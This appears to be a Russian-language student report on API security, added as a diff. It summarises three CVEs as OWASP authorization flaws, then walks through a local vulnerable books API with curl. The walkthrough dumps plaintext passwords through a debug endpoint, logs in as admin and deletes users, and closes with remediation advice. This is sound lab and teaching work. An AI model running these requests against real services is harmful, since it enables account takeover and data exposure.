@@ -1,0 +1,48 @@
+<h1 id="-1">Часть 1</h1>
+<h3 id="1-cve-2025-6187">1) CVE-2025-6187</h3>
+<p>В bSecure plugin для  WordPress эндпоинт /webhook/v2/order_info/ всегда выдавал true для проверки авторизации, что позволяло злоумышленнику знающему почту пользователя получить его куки и притвориться этим пользователем. В разрезе OWASP REST TOP 10 это Broken Function Level Authorization, так как функция (эндпоинт) доступна неавторизованному пользователю.</p>
+<h3 id="2-cve-2025-69221">2) CVE-2025-69221</h3>
+<p>LibreChat (клон ChatGPT) не проверяет авторизован ли пользователь на просмотр конфигурации какого-либо агента, даже приватного. Если злоумышленник знает идентификатор агента, то он может просмотреть его конфигурацию, разрешенные действия и то с какими аккаунтами он связан. Это Broken Object Level Authorization, так как не проверяются права пользователя на доступ к конкретному объекту (в этом случае настройкам агента).</p>
+<h3 id="3-cve-2025-62714">3) CVE-2025-62714</h3>
+<p>В Karmada Dashboard, панели для управления кластерами, API эндпоинты (условно /api/v1/secret, /api/v1/service) не имели никакой аутентификации или авторизации и были доступны всем (хоть web UI и требовал JWT для доступа). Это позволяло злоумышленникам получать конфиденциальные данные: ключи и секреты. Это Broken Authentication, так как эндпоинты вообще не требовали никакой аутентификации.</p>
+<h1 id="-2">Часть 2</h1>
+<p><strong>Обращаемся к приложению: curl localhost:8080</strong>
+{ &quot;создать базу&quot;: &quot;/createdb&quot;,     &quot;посмотреть информацию обо всех пользователях&quot;: &quot;/users/v1&quot;,     &quot;посмотреть подробную информацию обо всех пользователях&quot;: &quot;/users/v1/_debug&quot;,     &quot;регистрация нового пользователя&quot;: &quot;/users/v1/register (HTTP POST)&quot;,     &quot;вход в приложение&quot;: &quot;/users/v1/login (HTTP POST)&quot;,     &quot;просмотр пользователя по имени&quot;: &quot;/users/v1/{username}&quot;,     &quot;удалить пользователя по имени (только для админов)&quot;: &quot;/users/v1/{username} (HTTP DELETE)&quot;,     &quot;изменить email пользователя&quot;: &quot;/users/v1/{username}/email (HTTP PUT)&quot;,     &quot;изменить пароль пользователя&quot;: &quot;/users/v1/{username}/password (HTTP PUT)&quot;,     &quot;все книги&quot;: &quot;/books/v1&quot;,     &quot;добавить книгу&quot;: &quot;/books/v1 (HTTP POST)&quot;,     &quot;просмотр книги&quot;: &quot;/books/v1/{book}&quot;,  }
+<strong>Заполняем базу через /createdb</strong></p>
+<p><strong>Посмотрим информацию о юзерах (/users/v1):</strong>
+{&quot;users&quot;:[{&quot;email&quot;:&quot;mail1@mail.com&quot;,&quot;username&quot;:&quot;name1&quot;},{&quot;email&quot;:&quot;mail2@mail.com&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;email&quot;:&quot;admin@mail.com&quot;,&quot;username&quot;:&quot;admin&quot;}]}
+<strong>Видим почты всех пользователей - это нехорошо</strong></p>
+<p><strong>Попробуем полную информацию через /users/v1/_debug:</strong>
+{&quot;users&quot;:[{&quot;admin&quot;:false,&quot;email&quot;:&quot;mail1@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;name1&quot;},{&quot;admin&quot;:false,&quot;email&quot;:&quot;mail2@mail.com&quot;,&quot;password&quot;:&quot;pass2&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;admin&quot;:true,&quot;email&quot;:&quot;admin@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;admin&quot;}]}
+Вообще всё плохо!</p>
+<p><strong>Можем залогиниться под любым пользователем</strong>
+curl localhost:8080/users/v1/login --json &#39;{&quot;username&quot;:&quot;name1&quot;, &quot;password&quot;:&quot;pass1&quot;}&#39;
+{&quot;auth_token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMDY2OTIsImlhdCI6MTc3NzIwNjYzMiwic3ViIjoibmFtZTEifQ.iC-0w6Q9PVcexIyoaLbeJXSp1ikzXL8v4GGXnRw7XtI&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}</p>
+<p><strong>И даже под админом!</strong>
+~$ curl localhost:8080/users/v1/login --json &#39;{&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&quot;pass1&quot;}&#39;
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMDgwNDYsImlhdCI6MTc3NzIwNzk4Niwic3ViIjoiYWRtaW4ifQ.WUBbw7r1zvVEU5rLhE9K_JUnfcpd0KAwKnT6dA__rxE&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}</p>
+<p><strong>Зайдем под обычным пользователем name2</strong>
+~$ curl -X POST localhost:8080/users/v1/login --json &#39;{&quot;username&quot;:&quot;name2&quot;, &quot;password&quot;:&quot;pass2&quot;}&#39;
+{&quot;auth<em>token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMjQzMTIsImlhdCI6MTc3NzIyNDI1Miwic3ViIjoibmFtZTIifQ.fzYHSGyTq2JJUlwfW8086aK22wWc-gXNWns-</em>-axxcY&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+<strong>И попробуем поменять чужую почту:</strong>
+~$ curl -X PUT localhost:8080/users/v1/name1/email --json &#39;{&quot;email&quot;:&quot;hacked123123@hacked.com&quot;}&#39; -H &quot;Authorization: Bearer $USERTOKEN&quot;
+~$ curl localhost:8080/users/v1/_debug
+{&quot;users&quot;:[{&quot;admin&quot;:false,&quot;email&quot;:&quot;mail1@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;name1&quot;},{&quot;admin&quot;:false,&quot;email&quot;:&quot;hacked123123@hacked.com&quot;,&quot;password&quot;:&quot;pass2&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;admin&quot;:true,&quot;email&quot;:&quot;admin@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;admin&quot;}]}
+<strong>Не получилось, все равно поменяли свою почту</strong></p>
+<p><strong>Попробуем совершить вещи которые может только админ (удаление аккаунта)</strong>
+~$ curl -X DELETE  localhost:8080/users/v1/name1 -H &quot;Authorization: Bearer $ADMINTOKEN&quot;
+{&quot;message&quot;: &quot;User deleted.&quot;, &quot;status&quot;: &quot;success&quot;}%                                                                                                       ~$ curl localhost:8080/users/v1
+{&quot;users&quot;:[{&quot;email&quot;:&quot;mail2@mail.com&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;email&quot;:&quot;example@ex.com&quot;,&quot;username&quot;:&quot;admin&quot;}]}
+<strong>Да, у нас и в правду есть права админа</strong></p>
+<p><strong>Тогда попробуем удалить аккаунт даже не от имени админа</strong>
+$ curl -X DELETE  localhost:8080/users/v1/name2 -H &quot;Authorization: Bearer $USERTOKEN&quot; 
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Only Admins may delete users!&quot;}
+<strong>Значит токен админа как-то отличается от токена обычного пользователя.</strong></p>
+<p><strong>Итог: представленная здесь уязвимость - Broken Function Level Authorization, так как мы можем вызвать /users/v1/_debug, который (предположительно) должен быть открыт только для админов. Меры предотвращения:</strong></p>
+<ul>
+<li><p><strong>проверять авторизован ли пользователь с на совершение действия</strong></p>
+</li>
+<li><p><strong>убрать поле password из возвращаемых</strong></p>
+</li>
+<li><strong>вообще убрать этот эндпоинт из прод версии</strong></li>
+</ul>
